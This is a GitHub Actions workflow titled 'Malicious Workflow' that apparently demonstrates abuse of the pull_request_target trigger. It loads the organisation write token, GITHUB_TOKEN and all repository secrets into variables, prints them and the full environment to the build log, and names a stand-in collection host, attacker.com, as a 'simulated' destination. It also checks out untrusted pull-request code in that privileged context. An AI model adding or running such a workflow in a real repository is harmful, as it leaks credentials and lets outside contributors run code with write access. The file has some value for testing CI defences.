name: Malicious Workflow

on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  steal-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Attempt to exfiltrate secrets
        env:
          ORG_TOKEN: ${{ secrets.ORG_WRITE_TOKEN }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          ALL_SECRETS: ${{ toJSON(secrets) }}
        run: |
          echo "=== ATTEMPTING TO STEAL SECRETS ==="
          echo "ORG_WRITE_TOKEN: $ORG_TOKEN"
          echo "GITHUB_TOKEN: $GITHUB_TOKEN"
          echo "All secrets: $ALL_SECRETS"
          
          # Attempt to send to external server (simulated)
          echo "Would send to: https://attacker.com/collect"
          
          # Show what data we have access to
          echo "=== ENVIRONMENT INFO ==="
          env | sort
          
          echo "=== GIT INFO ==="
          echo "Current commit: $GITHUB_SHA"
          echo "Ref: $GITHUB_REF"
          
      - name: Attempt to checkout PR code
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      
      - name: Try to run code from PR
        run: |
          echo "=== ATTEMPTING TO RUN MALICIOUS CODE FROM PR ==="
          # If this runs, it could execute any code from the PR
          ls -la
          cat .github/workflows/steal-secrets.yml || true